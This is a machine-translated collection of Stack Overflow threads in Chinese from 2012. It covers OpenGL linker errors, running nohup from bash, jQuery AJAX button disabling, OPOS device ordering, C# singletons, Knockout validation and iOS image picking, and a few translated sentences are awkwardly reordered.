/tmp/cc0mDnPf.o: In function `glhistotex_init_full':
ljus.c:(.text+0x1fbe): undefined reference to `glGenTextures'
ljus.c:(.text+0x2018): undefined reference to `glGetError'
ljus.c:(.text+0x202c): undefined reference to `gluErrorString'
ljus.c:(.text+0x2079): undefined reference to `glBindTexture'
ljus.c:(.text+0x20cb): undefined reference to `glTexImage2D'
ljus.c:(.text+0x20e7): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2103): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2120): undefined reference to `glTexParameterf'
ljus.c:(.text+0x213d): undefined reference to `glTexParameterf'
ljus.c:(.text+0x2153): undefined reference to `glGenFramebuffersEXT'
ljus.c:(.text+0x2169): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x2196): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x21ba): undefined reference to `glFramebufferRenderbufferEXT'
ljus.c:(.text+0x21ce): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x21d3): undefined reference to `glGetError'
ljus.c:(.text+0x21e7): undefined reference to `gluErrorString'
/tmp/cc0mDnPf.o: In function `gen_histo_tex':
ljus.c:(.text+0x23ba): undefined reference to `glDisable'
ljus.c:(.text+0x2532): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x255a): undefined reference to `glClearColor'
ljus.c:(.text+0x2566): undefined reference to `glClear'
ljus.c:(.text+0x25c2): undefined reference to `glViewport'
ljus.c:(.text+0x25d7): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x25fc): undefined reference to `glUniform1i'
ljus.c:(.text+0x2656): undefined reference to `glUniform2f'
ljus.c:(.text+0x26b0): undefined reference to `glUniform2f'
ljus.c:(.text+0x270a): undefined reference to `glUniform2f'
ljus.c:(.text+0x271d): undefined reference to `glBindTexture'
ljus.c:(.text+0x274f): undefined reference to `glBegin'
ljus.c:(.text+0x2765): undefined reference to `glTexCoord2f'
ljus.c:(.text+0x277b): undefined reference to `glVertex2f'
ljus.c:(.text+0x2791): undefined reference to `glTexCoord2f'
ljus.c:(.text+0x27a5): undefined reference to `glVertex2f'
ljus.c:(.text+0x27bb): undefined reference to `glTexCoord2f'
ljus.c:(.text+0x27cd): undefined reference to `glVertex2f'
ljus.c:(.text+0x27e3): undefined reference to `glTexCoord2f'
ljus.c:(.text+0x27f7): undefined reference to `glVertex2f'
ljus.c:(.text+0x27fc): undefined reference to `glEnd'
ljus.c:(.text+0x2801): undefined reference to `glFinish'
ljus.c:(.text+0x2816): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x28a6): undefined reference to `glViewport'
ljus.c:(.text+0x28bb): undefined reference to `glBindTexture'
ljus.c:(.text+0x28e0): undefined reference to `glUniform1i'
ljus.c:(.text+0x293a): undefined reference to `glUniform2f'
ljus.c:(.text+0x2994): undefined reference to `glUniform2f'
ljus.c:(.text+0x29f4): undefined reference to `glUniform2f'
ljus.c:(.text+0x2a01): undefined reference to `glCallList'
ljus.c:(.text+0x2a06): undefined reference to `glFinish'
ljus.c:(.text+0x2a2f): undefined reference to `glBindFramebufferEXT'
/tmp/cc0mDnPf.o: In function `gen_tubelist':
ljus.c:(.text+0x2a4d): undefined reference to `glDisable'
ljus.c:(.text+0x2a89): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x2ac4): undefined reference to `glReadPixels'
ljus.c:(.text+0x2b2f): undefined reference to `sqrt'
ljus.c:(.text+0x2bcb): undefined reference to `glGenTextures'
ljus.c:(.text+0x2be5): undefined reference to `glBindTexture'
ljus.c:(.text+0x2c35): undefined reference to `glTexImage2D'
ljus.c:(.text+0x2c51): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2c6d): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2c8b): undefined reference to `glGenTextures'
ljus.c:(.text+0x2ca8): undefined reference to `glBindTexture'
ljus.c:(.text+0x2cf8): undefined reference to `glTexImage2D'
ljus.c:(.text+0x2d14): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2d30): undefined reference to `glTexParameteri'
ljus.c:(.text+0x2d54): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x2d82): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2db0): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2dde): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2e0c): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2e30): undefined reference to `glFramebufferRenderbufferEXT'
ljus.c:(.text+0x2e46): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x2e74): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2ea2): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2ed0): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2efe): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x2f22): undefined reference to `glFramebufferRenderbufferEXT'
ljus.c:(.text+0x2f35): undefined reference to `glBindTexture'
ljus.c:(.text+0x2f41): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2f54): undefined reference to `glBindTexture'
ljus.c:(.text+0x2f60): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2f73): undefined reference to `glBindTexture'
ljus.c:(.text+0x2f7f): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2f92): undefined reference to `glBindTexture'
ljus.c:(.text+0x2f9e): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2fb1): undefined reference to `glBindTexture'
ljus.c:(.text+0x2fbd): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2fd0): undefined reference to `glBindTexture'
ljus.c:(.text+0x2fdc): undefined reference to `glActiveTexture'
ljus.c:(.text+0x2fef): undefined reference to `glBindTexture'
ljus.c:(.text+0x2ffb): undefined reference to `glActiveTexture'
ljus.c:(.text+0x300e): undefined reference to `glBindTexture'
ljus.c:(.text+0x301a): undefined reference to `glActiveTexture'
ljus.c:(.text+0x302f): undefined reference to `glBindTexture'
ljus.c:(.text+0x303b): undefined reference to `glActiveTexture'
ljus.c:(.text+0x3063): undefined reference to `glViewport'
ljus.c:(.text+0x308b): undefined reference to `glClearColor'
ljus.c:(.text+0x30a1): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x30ad): undefined reference to `glDisable'
ljus.c:(.text+0x30b9): undefined reference to `glClear'
ljus.c:(.text+0x30e6): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x30f9): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3109): undefined reference to `glUniform1i'
ljus.c:(.text+0x311c): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x312c): undefined reference to `glUniform1i'
ljus.c:(.text+0x313f): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x314f): undefined reference to `glUniform1i'
ljus.c:(.text+0x3162): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3172): undefined reference to `glUniform1i'
ljus.c:(.text+0x3195): undefined reference to `glUniform1i'
ljus.c:(.text+0x31ce): undefined reference to `glUniform1f'
ljus.c:(.text+0x3245): undefined reference to `glUniform2f'
ljus.c:(.text+0x3298): undefined reference to `glUniform2f'
ljus.c:(.text+0x32d6): undefined reference to `glUniform1f'
ljus.c:(.text+0x3317): undefined reference to `glUniform2f'
ljus.c:(.text+0x333b): undefined reference to `glUniform1f'
ljus.c:(.text+0x334e): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x335b): undefined reference to `glCallList'
ljus.c:(.text+0x3371): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x337d): undefined reference to `glClear'
ljus.c:(.text+0x338e): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x33a1): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x33b1): undefined reference to `glUniform1i'
ljus.c:(.text+0x33c4): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x33d4): undefined reference to `glUniform1i'
ljus.c:(.text+0x33e7): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x33f7): undefined reference to `glUniform1i'
ljus.c:(.text+0x340a): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x341a): undefined reference to `glUniform1i'
ljus.c:(.text+0x343d): undefined reference to `glUniform1i'
ljus.c:(.text+0x347c): undefined reference to `glUniform1f'
ljus.c:(.text+0x34f9): undefined reference to `glUniform2f'
ljus.c:(.text+0x354c): undefined reference to `glUniform2f'
ljus.c:(.text+0x358a): undefined reference to `glUniform1f'
ljus.c:(.text+0x35cb): undefined reference to `glUniform2f'
ljus.c:(.text+0x35ef): undefined reference to `glUniform1f'
ljus.c:(.text+0x3602): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x360f): undefined reference to `glCallList'
ljus.c:(.text+0x3623): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x362f): undefined reference to `glDrawBuffer'
ljus.c:(.text+0x3642): undefined reference to `glDeleteTextures'
ljus.c:(.text+0x3655): undefined reference to `glDeleteTextures'
/tmp/cc0mDnPf.o: In function `check_timer':
ljus.c:(.text+0x367e): undefined reference to `glGetQueryObjectiv'
ljus.c:(.text+0x369f): undefined reference to `glGetQueryObjectiv'
/tmp/cc0mDnPf.o: In function `calc_pass':
ljus.c:(.text+0x36df): undefined reference to `glGetError'
ljus.c:(.text+0x36f3): undefined reference to `gluErrorString'
ljus.c:(.text+0x3773): undefined reference to `sin'
ljus.c:(.text+0x379c): undefined reference to `cos'
ljus.c:(.text+0x37d8): undefined reference to `sin'
ljus.c:(.text+0x3814): undefined reference to `cos'
ljus.c:(.text+0x3840): undefined reference to `cos'
ljus.c:(.text+0x3874): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3880): undefined reference to `glPushAttrib'
ljus.c:(.text+0x38a7): undefined reference to `glViewport'
ljus.c:(.text+0x38bc): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x38f1): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x390d): undefined reference to `glUniform2f'
ljus.c:(.text+0x3953): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3979): undefined reference to `glUniform3f'
ljus.c:(.text+0x399e): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x39b2): undefined reference to `glUniform3f'
ljus.c:(.text+0x39d7): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x39eb): undefined reference to `glUniform3f'
ljus.c:(.text+0x39fe): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x3a0b): undefined reference to `glCallList'
ljus.c:(.text+0x3a10): undefined reference to `glFinish'
ljus.c:(.text+0x3a25): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3a3a): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x3a6f): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3a8b): undefined reference to `glUniform2f'
ljus.c:(.text+0x3ab0): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3ac4): undefined reference to `glUniform3f'
ljus.c:(.text+0x3ad7): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x3ae4): undefined reference to `glCallList'
ljus.c:(.text+0x3ae9): undefined reference to `glFinish'
ljus.c:(.text+0x3afa): undefined reference to `glPopAttrib'
ljus.c:(.text+0x3b0e): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3b1a): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x3b26): undefined reference to `glDrawBuffer'
ljus.c:(.text+0x3b52): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3b5e): undefined reference to `glPushAttrib'
ljus.c:(.text+0x3b85): undefined reference to `glViewport'
ljus.c:(.text+0x3b9a): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x3bcf): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3beb): undefined reference to `glUniform2f'
ljus.c:(.text+0x3c31): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3c57): undefined reference to `glUniform3f'
ljus.c:(.text+0x3c7c): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3c90): undefined reference to `glUniform3f'
ljus.c:(.text+0x3cb5): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3cc9): undefined reference to `glUniform3f'
ljus.c:(.text+0x3ced): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3cff): undefined reference to `glUniform1f'
ljus.c:(.text+0x3d12): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x3d1f): undefined reference to `glCallList'
ljus.c:(.text+0x3d24): undefined reference to `glFinish'
ljus.c:(.text+0x3d39): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3d4e): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x3d83): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3d9f): undefined reference to `glUniform2f'
ljus.c:(.text+0x3dc4): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3dd8): undefined reference to `glUniform3f'
ljus.c:(.text+0x3dfc): undefined reference to `glGetUniformLocation'
ljus.c:(.text+0x3e0e): undefined reference to `glUniform1f'
ljus.c:(.text+0x3e21): undefined reference to `glDrawBuffers'
ljus.c:(.text+0x3e2e): undefined reference to `glCallList'
ljus.c:(.text+0x3e33): undefined reference to `glFinish'
ljus.c:(.text+0x3e44): undefined reference to `glPopAttrib'
ljus.c:(.text+0x3e58): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x3e64): undefined reference to `glUseProgramObjectARB'
ljus.c:(.text+0x3e70): undefined reference to `glDrawBuffer'
ljus.c:(.text+0x3e7f): undefined reference to `glGetError'
ljus.c:(.text+0x3e93): undefined reference to `gluErrorString'
ljus.c:(.text+0x3eed): undefined reference to `glBeginQuery'
ljus.c:(.text+0x3ef9): undefined reference to `glPushAttrib'
ljus.c:(.text+0x3f20): undefined reference to `glViewport'
ljus.c:(.text+0x3f2c): undefined reference to `glActiveTexture'
ljus.c:(.text+0x3f41): undefined reference to `glBindTexture'
ljus.c:(.text+0x3f4d): undefined reference to `glActiveTexture'
ljus.c:(.text+0x3f62): undefined reference to `glBindTexture'
ljus.c:(.text+0x3f6e): undefined reference to `glActiveTexture'
ljus.c:(.text+0x3f83): undefined reference to `glBindTexture'
ljus.c:(.text+0x3f8f): undefined reference to `glActiveTexture'
ljus.c:(.text+0x3fa4): undefined reference to `glBindTexture'
ljus.c:(.text+0x3fb0): undefined reference to `glActiveTexture'

... i had to trim it to fit in 30000 chars 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-26T19:34:13.493

```
gcc -std=gnu99 -Wall -o ljus -I. -lz -lglut -lGL -lGLU ljus.c 
```

参数顺序很重要。

尝试这个：

```
gcc -std=gnu99 -Wall ljus.c -o ljus -I. -lz -lglut -lGL -lGLU 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T19:26:10.847

报告丢失的函数不是基本 OpenGL ABI 的一部分，这意味着它们必须在运行时通过扩展加载机制加载。

最简单的解决方案：获取 GLEW（它在大多数 Linux 发行版的包管理器中）。在基于 Debian 的 Ubuntu 上运行`sudo apt-get install libglew-dev`。

在创建和/或激活 OpenGL 上下文（glXMakeCurrent、glutCreateWindow 等）之后替换`#include <GL/gl.h>`为`#include <GL/glew.h>`并调用。`glewInit();`

然后在编译单元源文件之后链接`-lGL -lGLEW ...` *并放置库列表！*. 一般来说，在两个不同的步骤中编译和链接是有意义的。

# bash - 在 bash 脚本中运行 nohup 时出错

> ID：13093133
> 
> 赞同：1
> 
> 时间：2012-10-26T19:23:21.253
> 
> 标签：bash, shell, sass, nohup

我的 bash/nohup 经验非常有限，所以我可能犯了一个基本错误。

我正在启动一个后台文件监视器。（如果重要的话，Sass 是一个 CSS 预处理器，它可以监控源文件并在检测到更改时自动将它们编译成 CSS。）

当我在 shell 提示符下输入它时，它会完美地启动 Sass 文件监视器：

```
nohup sass --watch /data/sass/:/data/css/ > /var/log/sass.out 2> /var/log/sass.err & 
```

但是当我把它放在这样的脚本中时（用于调试的简化示例脚本）：

```
COMMAND="[exactly the same command as above]"
echo `$COMMAND` 
```

我收到此错误：

```
nohup: ignoring input and redirecting stderr to stdout
Errno::ENOENT: No such file or directory - > Use --trace for backtrace. >>> 
Sass is watching for changes. Press Ctrl-C to stop. 
```

如果我指定完整路径 /usr/bin/local/sass，也会发生同样的事情。知道我哪里出错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:27:46.400

您不能通过以下方式运行复杂的命令（例如使用重定向）：

```
echo `$COMMAND` 
```

只有在运行简单的二进制文件或脚本时才能真正做到这一点。您`$COMMAND`需要在执行之前正确扩展，因此您需要运行：

```
echo `eval $COMMAND` 
```

# php - jQuery AJAX 进行中

> ID：13093135
> 
> 赞同：0
> 
> 时间：2012-10-26T19:23:29.593
> 
> 标签：php, html, ajax, jquery

因此，我在网站的主页上设置了密码恢复选项，该选项使用 swift mailer 向用户发送新密码。用户将他/她的电子邮件输入到一个框中，主页向 php 脚本发送一个 AJAX 请求。所有这些都有效，但是当您点击发送时，php 脚本需要一段时间才能发送回复说`New password successfully sent to email`. 我不希望用户一次又一次地点击发送，认为第一次点击没有通过。有没有办法在 ajax 等待脚本响应时禁用发送按钮并显示某种加载栏？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:26:12.077

您可以在单击按钮后禁用该按钮，然后在 ajax 完成时重新启用它。

所以在调用 ajax 之前，请执行以下操作：

```
 $("#MyBtn").attr("disabled", "disabled"); 
```

然后一旦 AJAX 完成，删除属性

```
$("#MyBtn").removeAttr("disabled"); 
```

你也可以有一个隐藏的 div 然后显示/隐藏它..

IE

```
<div id="divWait" style="display:none;">Please Wait...</div> 
```

您上面的代码现在是

所以在ajax调用之前：

```
 $("#MyBtn").attr("disabled", "disabled");
 $("divWait").show(); 
```

当 AJAX 完成时...

```
$("#MyBtn").removeAttr("disabled");   
$("#divWait").hide(); 
```

更重要的是，根据 AJAX 调用的结果，您也可以更改 div 内的文本。

所以..如果它有效，请不要隐藏 div，只需更改文本：

```
$("#divWait").html("Your password was sent.."); 
```

如果失败，像上面一样隐藏 div，或者更改消息

```
 $("#divWait").html("oops, there was a booboo"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:50:51.410

不要手动执行，而是使用 JQuery ajaxStart 和 ajaxStop 函数。

```
$('#progress').ajaxStart(function () {
 //disable the button
 $(this).show();
}).ajaxStop(function () {
 //enable the button
 $(this).hide();
}); 
```

注意：页面上的每个 JQuery AJAX 操作都会显示它。

# c# - 使用 OPOS 兼容硬件的事件顺序是什么？

> ID：13093136
> 
> 赞同：2
> 
> 时间：2012-10-26T19:23:32.717
> 
> 标签：c#, opos, pos-for-.net

我正在使用与 OPOS 兼容的 MSR。是事件的顺序：

1.  打开
2.  宣称
3.  使能够
4.  发布
5.  关

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-02T20:55:53.517

从技术上讲，它是`Open()`/ `ClaimDevice()`/ `DeviceEnabled`= TRUE / `DeviceEnabled`= FALSE / `ReleaseDevice()`/ `Close()`。

`Open()`请求指定设备的句柄，如果设备存在，应该可以工作。 `Close()`是匹配对函数，它应该在应用程序不再需要设备时调用。

`ClaimDevice()`（以前称为`Claim()`方法）将尝试访问设备。如果设备是专用设备（例如条形码扫描仪），`ClaimDevice()`则如果其他进程已声明它，则会失败。 `ReleaseDevice()`（也称为`Release()`但它的名称与COM方法冲突`Release()`）是当应用程序不再需要访问设备时应该调用的匹配对函数。这使得应用程序之间可以优雅地共享设备。例如，如果您的销售应用程序上有一个按钮可以进入库存应用程序 - 销售应用程序应该调用`ReleaseDevice()`扫描仪，以便库存应用程序可以成功调用`ClaimDevice()`。

设置`DeviceEnable`为 TRUE 将使设备准备好输入。如果是条码扫描仪，它会打开激光。只有启用的设备才会触发`DataEvent()`s。当您准备好接受条形码时，您通常会将条形码扫描仪设置为 true，然后如果条形码错误并且您希望它们停止扫描，则将其设置为 false。

从技术上讲，您不必`DeviceEnable`在调用之前设置为 false `ReleaseDevice()`；你甚至不必在打电话`ReleaseDevice()`之前打电话`Close()`。OPOS 就像一个神经质的女仆，即使应用程序没有清理它们也会清理它们。但是，我个人认为，如果设备管理不善，这就是编程草率的证据。

# c# - 站点范围的全局变量

> ID：13093139
> 
> 赞同：1
> 
> 时间：2012-10-26T19:24:01.193
> 
> 标签：c#, asp.net-mvc-3, iis-7

我很好奇在 MVC3 中创建站点范围的全局变量的最佳方法是什么。

也就是说，在多个请求/访问者之间共享的变量。

我猜，如果可能的话，一旦网站被回收，变量就会丢失..这样做还有其他利弊吗？

最好的办法当然是将所有内容存储在数据库中，但这更像是一个可能/实验性的问题；）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:26:58.163

您是否考虑将数据作为 XML 保存在 App_Data 文件夹中？

您*可以*创建一个单例，但这只是每个 AppDomain 的一个实例。如果您在 20 分钟内没有受到任何影响，IIS 将停止运行。

所以另一种真正的方法是将值保存在某个地方——文件或数据库。

**单例解决方案**

这是 C# 中的单例模式。

```
public class MyValues
{
    private readonly static MyValues instance = new MyValues();

    private MyValues() { }

    public static MyValues Instance
    {
        get { return instance; }
    }

    public string SomeValue { get; set; }

    public int SomeOtherValue { get; set; }
} 
```

# html - 如何消除图片链接上多余的可点击区域？

> ID：13093140
> 
> 赞同：1
> 
> 时间：2012-10-26T19:24:01.953
> 
> 标签：html, css, image, hyperlink

我有一个像这样的三角图像：

![标志png文件](../Images/d444604f362535b84cc9bb6ce819b5c5.png)

这是一个png文件。

我使用 html 访问它，如下所示：

```
<a href="/link"><img src="/logo.png" alt="alternate"></a> 
```

如何确保图像的唯一可点击区域是黑色区域而不是透明/白色部分？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:28:56.177

图像地图将为您做到这一点：http: [//www.w3schools.com/tags/tag_map.asp](http://www.w3schools.com/tags/tag_map.asp)

# arrays - 阵列上的淘汰赛验证

> ID：13093142
> 
> 赞同：10
> 
> 时间：2012-10-26T19:24:19.303
> 
> 标签：arrays, knockout.js, knockout-validation

我正在使用 Knockout Validation 来验证数组中的字段。它将显示错误消息，但我无法让 isValid() 或 ko.validation.group() 工作。我需要其中之一来处理提交。

```
errors = ko.validation.group(contactList(), {deep:true}); 
```

这是小提琴：http: [//jsfiddle.net/mduey/hEJWJ/80/](http://jsfiddle.net/mduey/hEJWJ/80/)

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-24T13:18:42.143

我遇到了同样的问题，可以通过将 observable config 属性设置为 false 来解决。每次调用错误函数时都会触发深度验证：

```
 ko.validation.init({
        grouping: {
            deep: true,
            observable: false //important ! Needed so object trees are correctly traversed every time so added objects AFTER the initial setup get included
        },
        insertMessages: true,
        messagesOnModified: true,
        debug: false
    }); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-10T00:18:59.330

问题是当您将新的数组元素添加到您的`observableArray`. [这是一个快速的肮脏解决方案，可以进一步优化。](http://jsfiddle.net/hEJWJ/152/)

每次您将新元素添加到您的`observableArray`I 运行验证时，将其结果放入 observable 中，以便可以通过视图绑定正确跟踪它。它可以通过`throttle`设置进一步改进，因此验证不会在每次推送到数组时运行（实际用于循环）。正如我所看到的，当前`ko.validation.group`返回的不是应有的适当可观察对象，因此我必须为它创建一个包装器。

# iphone - UIImagePickerController 选择多个图像

> ID：13093143
> 
> 赞同：2
> 
> 时间：2012-10-26T19:24:24.740
> 
> 标签：iphone, ios, xcode, uiimagepickercontroller, photolibrary

我正在尝试使用 UIImagePickerController 从照片库中简单地选择多个图像，我希望我可以在照片选择器的底部添加一个子视图，这样它看起来就像这个应用程序一样：

有一个简单的方法可以做到吗？我的代码目前仅以标准方式弹出图像，但仅在加载 6 张图像时关闭控制器

**重要的是，如果无论如何我可以向照片选择器视图添加一个小视图/工具栏，就像示例中所做的那样，那么我可以完成剩下的工作**

![示例查看 - 底部有自定义工具栏](../Images/b9b5772c731aff1a059d216f37a91db6.png)

```
 - (void)getMediaFromSource:(UIImagePickerControllerSourceType)sourceType{
      //get all available source types
      NSArray *mediaTypes = [UIImagePickerController availableMediaTypesForSourceType:sourceType];

      //if source type available and supported media type is not null
      if ([UIImagePickerController isSourceTypeAvailable:sourceType
           && [mediaTypes count] > 0]) {

        UIImagePickerController *picker = [[UIImagePickerController alloc] init];
        //picker.mediaTypes = mediaTypes;   //allow videos
        picker.delegate = self;
        picker.sourceType = sourceType; //set source type to the given type

        /** WANT TO ADD A CUSTOM VIEW IN THE PHOTO PICKER VIEW **/

        [self presentViewController:picker animated:YES completion:nil];
      } else {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error accessing media"
                                                        message:@"Device doesn't support that media type"
                                                       delegate:nil
                                              cancelButtonTitle:@"Drat !"
                                              otherButtonTitles: nil];
        [alert show];
      }
    }

    - (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info{
      self.lastChosenMediaType = [info objectForKey:UIImagePickerControllerMediaType];  //record media type

      //if media type is image
      if ([lastChosenMediaType isEqual:(NSString *) kUTTypeImage]) {
        UIImage *chosenImage = [info objectForKey:UIImagePickerControllerOriginalImage];    //load image

        //save the image if is from camera shot
        if (imageOrVideoSourceType == UIImagePickerControllerSourceTypeCamera) {
          UIImageWriteToSavedPhotosAlbum (chosenImage, nil, nil , nil);
        }

        [images addObject:chosenImage]; //add to image list
        imageNum++;
      }

      changeImageOrVideo = true;

      if(imageNum >= 5){
          [picker dismissViewControllerAnimated:YES completion:nil];
      }
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T22:38:07.583

使用诸如将 UIImagePickerController 向上移动并在下方显示选定图像之类的技巧的主要原因是，资产库替代方案将涉及用户被要求访问位置，因为有关照片拍摄地点的信息在图像元数据中可用。

在 iOS 6 中，系统会询问用户是否允许应用访问他们的照片（而不是位置），并且您会被问到资源库方法和 UIImagePickerController 方法的这个问题。

因此，我认为像上面这样的黑客已经接近了它们的用处。[这是一个库的链接，该库使用资产库提供多个图像的选择，](https://github.com/w5mith/WSAssetPickerController)还有其他的。

# javascript - 使用 javascript 构建本机应用程序时处理重定向 uri

> ID：13093148
> 
> 赞同：1
> 
> 时间：2012-10-26T19:24:50.233
> 
> 标签：javascript, api, sdk, native

我有个问题。我知道 facebook 可以适应它，但是如果我正在使用 javascript 创建应用程序并想使用 api，那么处理 redirect_uri 的最佳方法是什么？

我想过使用 iframe，将数据传递回父级，然后关闭 iframe，但我遇到了问题。显然，整个跨域可能会使它变得无用，但即使在此之前，当我将它作为普通站点运行时（iframe 位于同一域上），我在使用 instagram api 时也会遇到这种奇怪的情况。（我假设它是通用的）

*   如果我在线登录到 instagram，它会运行并获取数据，但似乎不会将数据发送给父级

*   如果我没有登录它不会做任何事情，php 重定向到 instagram 登录页面根本不会去那里。

不过，我对不使用 iframe 的可能解决方案更感兴趣。

想法？

# c# - 在 C# 中公开表单中的单选按钮输入？

> ID：13093149
> 
> 赞同：-1
> 
> 时间：2012-10-26T19:24:53.417
> 
> 标签：c#, forms, enums, radio-button, public

我有代码，我知道我已经完成了 99% 的工作。MS VS2008 中的 C# 编码。

基本上我有一个有 4 个单选按钮和一个继续按钮的表单。用户单击其中一个单选按钮并单击继续，这一切正常。

但是，我想使用用户输入的值（即，如果他们单击第一个按钮，我想要一个等于 1 的变量，第二个按钮等于 2，依此类推）。我尝试在各个方面这样做，但我可以让它运行的唯一地方是在私有 void btnOkClick 行中，这意味着我可以使用这个 void 之外的值，这是我真正想要的。

我尝试过设置一些枚举等（在下面的代码中注释掉），但我不太明白。我知道我必须接近，但是当我继续阅读帖子并且无法完全掌握它时，我的新手真的表现出来了。

简而言之，我希望我的 VS2008 项目中的其他类能够引用用户在初始表单中选择的任何值。

```
namespace AmortClient
{
    public partial class frmLoadACTFCST : Form
    {
        public frmLoadACTFCST()
        {
            InitializeComponent();
            //set the parent of the form to the container
            //this.MdiParent = parent;
        }

        //public enum ACTFCST
        //{
        //    ACT = 1,
        //    FCST = 2,
        //    PLAN = 3,
        //    FiveYearPlan2012=4
        //}

        //private ACTFCST _actfcst = ACTFCST.ACT;
        //public ACTFCST actfcst
        //{
        //    get { return _actfcst; }
        //    set { _actfcst = value; }
        //}

        private void frmLoadACTFCST_Load(object sender, EventArgs e)
        {            

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void btnActual_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void btnForecast_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void btnPlan_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void btn5YrPlan2012_CheckedChanged(object sender, EventArgs e)
        {

        }    

        private void btnContinue_Click(object sender, EventArgs e)
        {
            string ACTFCSTtext = "";
            int dataTypeKey = 0;

            if (btnActual.Checked)
            {
                ACTFCSTtext = btnActual.Text;
                dataTypeKey = 1;
            }
            else if (btnForecast.Checked)
            {
                ACTFCSTtext = btnForecast.Text;
                dataTypeKey = 2;
            }

            else if (btnPlan.Checked)
            {
                ACTFCSTtext = btnPlan.Text;
                dataTypeKey = 3;
            }

            else if (btn5YrPlan2012.Checked)
            {
                ACTFCSTtext = btn5YrPlan2012.Text;
                dataTypeKey = 4;
            }

            string msg = "";
            msg = ACTFCSTtext + " " + dataTypeKey;

            //btn5YrPlan2012
            MessageBox.Show(msg);
            Close();

        }

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:32:41.390

